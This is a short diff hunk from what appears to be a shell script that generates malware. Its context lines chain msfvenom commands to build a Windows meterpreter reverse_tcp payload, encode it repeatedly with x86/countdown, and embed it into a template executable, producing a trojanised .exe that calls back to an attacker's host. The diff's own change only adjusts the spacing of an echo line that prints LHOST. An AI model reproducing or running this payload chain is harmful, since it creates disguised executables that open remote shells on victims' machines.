@@ -35,5 +35,5 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw | \
 msfvenom -a x86 --platform windows -e x86/countdown -i $countdown -f raw - | \
 msfvenom -a x86 --platform windows -x $template -f exe -o $output
 
-echo "LHOST为: $lhost"
+echo "LHOST为:   $lhost"
 echo "LPORT值为: $lport"
